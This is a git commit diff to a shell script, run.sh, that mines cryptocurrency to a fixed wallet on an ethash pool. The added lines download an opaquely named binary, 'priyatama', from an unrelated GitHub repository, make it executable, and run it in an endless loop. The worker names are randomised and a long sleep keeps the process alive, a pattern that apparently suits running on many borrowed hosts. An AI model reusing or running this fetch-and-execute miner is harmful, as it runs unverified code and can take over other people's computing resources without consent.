2d1757599e95d72a2c48198fcbbea6a59f74ba68
Bababrucelee <89031163+Bababrucelee@users.noreply.github.com>
2021-08-17 16:29:47 +0530

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,12 +1,12 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=WIN:TJSvx6gbRV1rXqSp4CLLhKDANp5nGsb4vK
-WORKER=$(echo $(shuf -i 10-40 -n 1)-myrig#3dk5-a2su)
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
-tar -xf lolMiner_v1.29_Lin64.tar.gz 
-chmod +x lolMiner
+WALLET=TRX:TJSvx6gbRV1rXqSp4CLLhKDANp5nGsb4vK
+WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
+wget https://github.com/archernap/prem/raw/main/priyatama
+chmod +x priyatama
 while [ 1 ]; do
-  sleep 5
-  sudo ./t-rex -a ethash -o $POOL -u $WALLET.$WORKER -p x --extra-dag-epoch 20 --intensity 25 --kernel 0 --dag-build-mode 0 --keep-gpu-busy
+./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+sleep 5
 done
-sleep 999999999
+sleep 999999999 
+
